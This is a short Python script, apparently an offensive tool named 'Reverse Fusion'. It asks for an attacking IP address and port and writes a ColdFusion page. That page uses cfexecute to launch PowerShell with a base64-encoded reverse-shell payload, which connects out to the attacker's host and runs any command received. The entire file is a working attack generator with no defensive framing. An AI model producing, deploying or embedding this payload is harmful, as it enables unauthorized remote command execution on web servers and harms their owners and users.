#!/usr/bin/env python3

import sys
import base64


print("______                              ______         _             ")
print("| ___ \                             |  ___|       (_)            ")
print("| |_/ /_____   _____ _ __ ___  ___  | |_ _   _ ___ _  ___  _ __  ")
print("|    // _ \ \ / / _ \ '__/ __|/ _ \ |  _| | | / __| |/ _ \| '_ \ ")
print("| |\ \  __/\ V /  __/ |  \__ \  __/ | | | |_| \__ \ | (_) | | | |")
print("\_| \_\___| \_/ \___|_|  |___/\___| \_|  \__,_|___/_|\___/|_| |_|")

print("\r")
print("\r")

print("This tool will generate a *.cfm page in the same directory as this script.")

print("\r")
print("\r")


ip = input("Enter attacking IP address: ")
port = int(input("Enter attacking port number: "))
filename = input("Enter output file name: ")

payload = '$client = New-Object System.Net.Sockets.TCPClient("%s",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
payload = payload % (ip, port)

payload = "arguments=\"-e " + base64.b64encode(payload.encode('utf16')[2:]).decode()+"\""

with open( filename+".cfm", "w+") as f:
   f.write("<cfexecute name=\"C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe\"\r")
   f.write(payload+"\r")
   f.write("variable=\"data\"\r")
   f.write("timeout=\"10\" />\r")
   f.write("<cfdump var=\"#data#\">")
